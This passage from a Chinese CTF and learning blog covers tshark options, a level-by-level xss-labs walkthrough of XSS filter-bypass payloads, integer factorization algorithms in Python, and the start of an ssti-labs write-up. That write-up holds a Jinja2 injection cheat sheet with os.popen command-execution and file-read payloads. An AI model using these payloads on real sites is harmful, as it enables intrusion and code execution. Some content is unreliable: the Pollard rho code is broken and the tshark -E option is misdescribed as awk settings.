<p>-P, --print : 打印数据包摘要，即使在写入文件时也是如此。</p>
</li>
<li>
<p>-S <separator> : 在数据包之间打印的行分隔符。</p>
</li>
<li>
<p>-x : 添加十六进制和ASCII转储的输出（数据包字节）。</p>
</li>
<li>
<p>–hexdump <hexoption> : 添加hexdump，设置数据源和ASCII转储的选项。可选的值包括：</p>
<ul>
<li>all : 转储所有数据源（-x 默认）。</li>
<li>frame : 仅转储帧数据源。</li>
<li>ascii : 包括ASCII转储文本（-x 默认值）。</li>
<li>delimit : 用 ‘|’ 分隔 ASCII 转储文本人物。</li>
<li>noascii : 排除ASCII转储文本。</li>
<li>help : 显示–hexdump的帮助并退出。</li>
</ul>
</li>
<li>
<p>-T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|? : 文本输出格式（默认：text）。可选的值包括：</p>
<ul>
<li>pdml : Packet Details Markup Language (PDML) 格式。</li>
<li>ps : PostScript格式。</li>
<li>psml : Packet Summary Markup Language (PSML) 格式。</li>
<li>json : JSON格式。</li>
<li>jsonraw : 未格式化的JSON格式。</li>
<li>ek : ElasticSearch格式。</li>
<li>tabs : Tab分隔符格式。</li>
<li>text : 文本格式。</li>
<li>fields : 指定的字段格式。</li>
<li>? : 列出所有可用的输出格式。</li>
</ul>
</li>
<li>
<p>-j <protocolfilter> : 如果选择了-T ek|pdml|json，则协议层过滤（例如“ip ip.flags text”，过滤器不展开子节点，除非在过滤器中也指定了子节点）。</p>
</li>
<li>
<p>-J <protocolfilter> : 顶级协议过滤器，如果选择了-T ek|pdml|json（例如“http tcp”，展开所有子节点的过滤器）。</p>
</li>
<li>
<p>-e <field> : 如果选择了-T fields，则要打印的字段（例如tcp.port，_ws.col.Info）。可以重复此选项以打印多个字段。</p>
</li>
<li>
<p>-E<fieldsoption>=<value>是一个用于awk命令的选项，用于在执行文本处理时设置输出选项。其中，<fieldsoption>可以是以下值之一：</p>
<ul>
<li>FS：设置输入字段分隔符，类似于awk命令中的-F选项。</li>
<li>OFS：设置输出字段分隔符，类似于awk命令中的-F选项。</li>
<li>RS：设置输入记录分隔符，类似于awk命令中的-R选项。</li>
<li>ORS：设置输出记录分隔符，类似于awk命令中的-R选项。</li>
<li>NF：设置每个记录的字段数，类似于awk命令中的-F选项。</li>
<li>FILENAME：设置当前输入文件的文件名，类似于awk命令中的FILENAME变量。</li>
<li>FNR：设置当前记录号（在当前文件中的记录数），类似于awk命令中的FNR变量。</li>
</ul>
<p>而<value>则是选项的具体值，可以是任何有效的文本字符串。</p>
<p>举个例子，使用-EFS=','选项可以将输入字段分隔符设置为逗号，而使用-ENF=4选项则可以强制要求每个记录都必须有4个字段。</p>
</li>
<li>
<p><code>-z &lt;statistics&gt;</code> 是用于捕获统计信息的选项。使用此选项可以捕获各种有关流量的信息，例如每个协议的数量、每个 IP 地址的数量等等。以下是一些可用的统计信息选项：</p>
<ul>
<li>
<p><code>icmp</code>：捕获 ICMP 包的统计信息</p>
</li>
<li>
<p><code>tcp</code>：捕获 TCP 包的统计信息</p>
</li>
<li>
<p><code>udp</code>：捕获 UDP 包的统计信息</p>
</li>
<li>
<p><code>http</code>：捕获 HTTP 流量的统计信息</p>
</li>
<li>
<p><code>dns</code>：捕获 DNS 流量的统计信息</p>
</li>
<li>
<p><code>smb</code>：捕获 SMB 流量的统计信息</p>
</li>
<li>
<p><code>radius</code>：捕获 RADIUS 流量的统计信息</p>
</li>
<li>
<p><code>radius_acct</code>：捕获 RADIUS 计费流量的统计信息</p>
</li>
<li>
<p><code>radius_auth</code>：捕获 RADIUS 认证流量的统计信息</p>
</li>
<li>
<p><code>radius_coa</code>：捕获 RADIUS COA 流量的统计信息</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc工具</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs</title>
    <url>/2023/02/25/11-03-32/</url>
    <content><![CDATA[<h1>xss-labs</h1>
<span id="more"></span>
<h2 id="level1">level1</h2>
<p>观察后直接再url上的test添加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="level2">level2</h2>
<p>使用搜索框，输入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是被过滤了一部分</p>
<p>&lt; &gt; “ ”被过滤</p>
<p>因此需要绕过</p>
<p>查资料之后发现，&lt; &gt; “ ”被转化成实体html字符实体。</p>
<p>但是，语句经过了一个input转化为文本，于是可以利用input闭合</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="level3">level3</h2>
<p>即使对input进行闭合，也无法绕过，依然会对&lt;&gt;等进行过滤</p>
<p>于是需要有一个不用&lt;&gt;的语句</p>
<p>查资料发现有以下几种</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27; onclick =&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
<p>点击事件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
<p>鼠标移入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;onfocus=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
<p>聚焦点击</p>
<h2 id="level4">level4</h2>
<p>单引号换成双引号即可</p>
<h2 id="level5">level5</h2>
<p>本题测试之后，首先过滤&lt;&gt;，还有在on，script中会插入_</p>
<p>那么之前的方法都不能用了</p>
<p>使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(‘xss’);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>进行构造，发现&quot;&gt;留在了搜索框的后面，也就是说有url的注入</p>
<p>可以用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>进行构造</p>
<h2 id="level6">level6</h2>
<p>比较有趣的是，相比于level5，6少了一个对输入全小写的处理过程，于是可以用大小写绕过str_replace</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrEf</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="level7">level7</h2>
<p>过滤script，href,因此需要新思路来看，由于是直接删除字段，那么根据sqli-labs的less25来看，对其进行双写即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrehreff</span>=<span class="string">javascrscriptipt:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="level8">level8</h3>
<p>过滤script，href以及双引号，因此需要看一下源码，发现注入点有两个，其中一个直接放入<a></a>中的url中，于是直接用javascript:alert(‘xss’)同时逃过即可</p>
<p>而在使用url时，会进行一次解码，所以用unicode编码绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#x006a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0076;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0069;</span><span class="symbol">&amp;#x0070;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x003a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x006c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x0028;</span><span class="symbol">&amp;#x0027;</span><span class="symbol">&amp;#x0078;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0027;</span><span class="symbol">&amp;#x0029;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</span><br></pre></td></tr></table></figure>
<h2 id="level9">level9</h2>
<p>需要具有<a href="http://xn--p8su49ae8h">http://的字段</a></p>
<p>于是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span>http://<span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span></span><br></pre></td></tr></table></figure>
<p>加上<a href="http://xn--zlr2k">http://即可</a></p>
<h2 id="level10">level10</h2>
<p>查看源码发现只有t_sort可以利用，但是在没有源码的情况下如何测试？</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_link=&quot; type=&quot;text&quot; &amp;t_history=&quot; type=&quot;text&quot; &amp;t_sort=&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
<p>直接将其放入url发现只有t_sort有反应</p>
<p>然后就可以直接构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; type=&quot;text” onmouseover=&quot;javascript:alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level11">level11</h2>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_link=&quot;type=&quot;text&amp;t_history=&quot;type=&quot;text&amp;t_sort=&quot;type=&quot;text&amp;t_ref=&quot;type=&quot;text</span><br></pre></td></tr></table></figure>
<p>依然是t_sort有反应，把上一题的payload扔进去，发现”“转码了</p>
<p>使用unicode试试，发现传不进去</p>
<p>只能看源码了，发现直接跟refer有关，因此需要抓包了</p>
<p>然后发现refer直接传到t_ref的value中</p>
<p>于是可以直接构造</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level12">level12</h2>
<p>在UA处进行注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level13">level13</h2>
<p>靶场好像出了一点点问题</p>
<p>出现了不正常的warning，问题不大，看了源码后就可以直接发现是cookie</p>
<h2 id="level14">level14</h2>
<p>整个网页有问题没法做</p>
<p>最终的payload为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>原理为img的链接不存在会直接执行报错语句</p>
<h2 id="level15">level15</h2>
<p>刚开始有一个404界面，删去src之后正常了</p>
<p>那么src就是其中的一个注入点，看源码之后发现其中有一个ng-include:在body里面</p>
<p>那么根据查了一下资料</p>
<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。</p>
<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">ng-include</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">autoscroll</span>=<span class="string">&quot;expression&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">element</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ng-include 指令作为元素使用:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ng-include</span> <span class="attr">src</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">autoscroll</span>=<span class="string">&quot;expression&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">ng-include</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是说可以利用同域名下的网页包含xss</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是没法成功</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(233)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>上面都是可行的（不知道为什么）</p>
<h2 id="level16">level16</h2>
<p>过滤了空格和/</p>
<p>可以用%0a,%0d代替</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img%0asrc=2%0aonerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img%0dsrc=2%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level17-20">level17-20</h2>
<p>插件不支持(IE也只能支持17和18，19出bug)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b%20onmouseover=%27javascript:alert(1)%27</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>整数分解</title>
    <url>/2023/02/26/14-39-32/</url>
    <content><![CDATA[<h1>关于整数分解算法学习记录</h1>
<span id="more"></span>
<p>参考连接：<a href="https://en.wikipedia.org/wiki/Integer_factorization">https://en.wikipedia.org/wiki/Integer_factorization</a></p>
<h2 id="1-试除法">1. 试除法</h2>
<p>该方法思路是将每个数都尝试作为整数的因子去寻找，速度慢，没有什么可说的</p>
<h2 id="2-Wheel-factorization">2. Wheel factorization</h2>
<p>基于剔除素数的倍数，筛选出素数后进行试除。</p>
<p>优化方法：1.埃拉托色尼筛  2.欧拉筛法</p>
<h2 id="3-Pollard’s-rho-algorithm">3. Pollard’s rho algorithm</h2>
<p>参考连接：</p>
<p>[<a href="http://jayxv.github.io/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard's">http://jayxv.github.io/2019/11/11/密码学学习笔记之浅析Pollard’s</a> rho algorithm及其应用/](<a href="https://jayxv.github.io/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard's">https://jayxv.github.io/2019/11/11/密码学学习笔记之浅析Pollard’s</a> rho algorithm及其应用/)</p>
<p>原理有兴趣可以研究一下我写的另一篇博客《algorithm算法原理证明》</p>
<p>算法的核心思想是通过随机选择一个起始点和一个随机的多项式来寻找两个非平凡的因子。在每一步迭代中，算法计算多项式的值，并使用 Floyd 的环检测算法（Floyd’s cycle-finding algorithm）来寻找环。如果环的长度为偶数，则找到了一个非平凡的因子，否则，算法会继续尝试其他的起始点和多项式，直到找到两个因子为止。</p>
<p>该算法的具体实现如下：</p>
<ol>
<li>
<p>选择一个起点x0，然后根据一个递推公式生成一系列数列：<br />
$$<br />
x_i = f(x_{i-1})<br />
$$<br />
其中f是一个特定的函数。在Pollard’s ρ算法中，函数f通常是下面这个式子：<br />
$$<br />
f(x) = x^2 + c \pmod n<br />
$$<br />
其中c是一个随机数，n是需要分解的大整数。</p>
</li>
<li>
<p>然后在数列中选择两个不同的位置i和j（i!=j）。</p>
</li>
<li>
<p>对这两个位置的元素进行求差运算，即：<br />
$$<br />
d = gcd(|xi - xj|, n)<br />
$$<br />
如果d不等于1或者n，则说明已经找到了n的一个因子，结束算法。</p>
</li>
<li>
<p>如果没有找到因子，则继续执行步骤1，生成新的数列，直到找到一个因子为止。</p>
</li>
</ol>
<p>Pollard’s ρ算法是一种随机算法，因此其运行时间取决于随机数的选择。在实际应用中，该算法的平均时间复杂度约为O(sqrt(n))。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def gcd(a, b):</span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">def mapx(x):</span><br><span class="line">    x=(x*x+1)%n</span><br><span class="line">    return x</span><br><span class="line"></span><br><span class="line">def pollard_rho(x1,x2):</span><br><span class="line">    while 1:</span><br><span class="line">        x1 = mapx(x1)</span><br><span class="line">        x2 = mapx(mapx(x2))</span><br><span class="line">        p = gcd(a - i, n)</span><br><span class="line">        if p != 1:</span><br><span class="line">            return p</span><br><span class="line">n=...</span><br><span class="line"></span><br><span class="line">while (n!=1):</span><br><span class="line">    p = pollard_rho(2,2)</span><br><span class="line">    print p</span><br><span class="line">    n = n / p</span><br></pre></td></tr></table></figure>
<h2 id="4-Euler’s-factorization-method">4.Euler’s factorization method</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">def euler_factorize(n):</span><br><span class="line">    if is_prime(n):</span><br><span class="line">        print(&quot;Number is not factorable&quot;)</span><br><span class="line">        return []</span><br><span class="line">    </span><br><span class="line">    for a in range(1, math.ceil(math.sqrt(n))):</span><br><span class="line">        b2 = n - a*a</span><br><span class="line">        b = math.floor(math.sqrt(b2))</span><br><span class="line">        if b*b == b2:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Failed to find any expression for n as sum of squares&quot;)</span><br><span class="line">        return []</span><br><span class="line">    </span><br><span class="line">    for c in range(a+1, math.ceil(math.sqrt(n))):</span><br><span class="line">        d2 = n - c*c</span><br><span class="line">        d = math.floor(math.sqrt(d2))</span><br><span class="line">        if d*d == d2:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Failed to find a second expression for n as sum of squares&quot;)</span><br><span class="line">        return []</span><br><span class="line">    </span><br><span class="line">    A, B = c-a, c+a</span><br><span class="line">    C, D = b-d, b+d</span><br><span class="line">    k = math.gcd(A, C) // 2</span><br><span class="line">    h = math.gcd(B, D) // 2</span><br><span class="line">    l = math.gcd(A, D) // 2</span><br><span class="line">    m = math.gcd(B, C) // 2</span><br><span class="line">    factor1 = k*k + h*h</span><br><span class="line">    factor2 = l*l + m*m</span><br><span class="line">    return [factor1, factor2]</span><br></pre></td></tr></table></figure>
<h2 id="5-Lenstra-elliptic-curve-factorization算法">5. Lenstra elliptic-curve factorization算法</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def is_prime(n):</span><br><span class="line">    if n &lt;= 1:</span><br><span class="line">        return False</span><br><span class="line">    elif n &lt;= 3:</span><br><span class="line">        return True</span><br><span class="line">    elif n % 2 == 0 or n % 3 == 0:</span><br><span class="line">        return False</span><br><span class="line">    i = 5</span><br><span class="line">    while i*i &lt;= n:</span><br><span class="line">        if n % i == 0 or n % (i+2) == 0:</span><br><span class="line">            return False</span><br><span class="line">        i += 6</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def scalar_multiply(k, P, a, p):</span><br><span class="line">    if k == 0:</span><br><span class="line">        return None</span><br><span class="line">    elif k == 1:</span><br><span class="line">        return P</span><br><span class="line">    elif k % 2 == 0:</span><br><span class="line">        Q = scalar_multiply(k // 2, P, a, p)</span><br><span class="line">        return add_points(Q, Q, a, p)</span><br><span class="line">    else:</span><br><span class="line">        Q = scalar_multiply((k-1) // 2, P, a, p)</span><br><span class="line">        return add_points(add_points(Q, Q, a, p), P, a, p)</span><br><span class="line"></span><br><span class="line">def add_points(P, Q, a, p):</span><br><span class="line">    if P == Q:</span><br><span class="line">        s = ((3*P[0]*P[0] + a) * pow(2*P[1], p-2, p)) % p</span><br><span class="line">    else:</span><br><span class="line">        s = ((Q[1] - P[1]) * pow(Q[0] - P[0], p-2, p)) % p</span><br><span class="line">    x = (s*s - P[0] - Q[0]) % p</span><br><span class="line">    y = (s*(P[0] - x) - P[1]) % p</span><br><span class="line">    return (x, y)</span><br><span class="line"></span><br><span class="line">def lenstra_factorize(n, t=1000):</span><br><span class="line">    if n &lt; 2:</span><br><span class="line">        return []</span><br><span class="line">    if n == 2:</span><br><span class="line">        return [2]</span><br><span class="line">    if n % 2 == 0:</span><br><span class="line">        return [n//2, 2]</span><br><span class="line">    if is_prime(n):</span><br><span class="line">        return [n]</span><br><span class="line"></span><br><span class="line">    for i in range(1, t+1):</span><br><span class="line">        a = np.random.randint(1, n)</span><br><span class="line">        x = np.random.randint(0, n)</span><br><span class="line">        y = np.random.randint(0, n)</span><br><span class="line">        P = (x, y)</span><br><span class="line">        Q = scalar_multiply(2, P, a, n)</span><br><span class="line">        d = np.gcd(Q[0] - P[0], n)</span><br><span class="line">        if d != 1 and d != n:</span><br><span class="line">            return [d, n//d]</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line">print(lenstra_factorize(561))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti-labs</title>
    <url>/2023/02/25/11-16-55/</url>
    <content><![CDATA[<h1>ssti-labs</h1>
<span id="more"></span>
<h2 id="基本知识点">基本知识点</h2>
<p>思路：</p>
<p>先写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/level/1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;《&quot;</span>,response.text,<span class="string">&quot;》&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>得到os存在的类</p>
<p>133 《 Hello &lt;class ‘os._wrap_close’&gt; 》</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line"></span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">self.__dict__		 保存当前类实例或对象实例的属性变量键值对字典，</span><br><span class="line">&#123;%print(&quot;DMIND&quot;)%&#125;	 控制语句中也能输出</span><br><span class="line"></span><br><span class="line">拼接字符：&#123;% set ind=dict(ind=a,ex=a)|join%&#125;		变量ind=index</span><br><span class="line">获取字符：&#123;&#123;lipsum|string|list|attr(&#x27;pop&#x27;)(18)&#125;&#125; 相当于：lipsum|string|list|attr(&#x27;pop&#x27;)(18)  输出：_（下划线）</span><br><span class="line">得到数字：&#123;&#123;lipsum|string|list|attr(&#x27;index&#x27;)(&#x27;g&#x27;)&#125;&#125; 相当于lipsum|string|list|attr(&#x27;index&#x27;)(&#x27;g&#x27;) 输出：10</span><br><span class="line">运算出其他数字：&#123;% set shiba=ten%2bten-two %&#125;        %2b是URL编码后的加号</span><br><span class="line"></span><br><span class="line">得到数字：&#123;&#123;dict(a=a)|lower|list|count&#125;&#125;得到16</span><br><span class="line">运算出其他数字：&#123;&#123;dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count&#125;&#125;得到1</span><br><span class="line"></span><br><span class="line">得到任意字符：&#123;&#123;dict(dmind=a)|slice(1)|first|first&#125;&#125;得到dmind</span><br><span class="line"></span><br><span 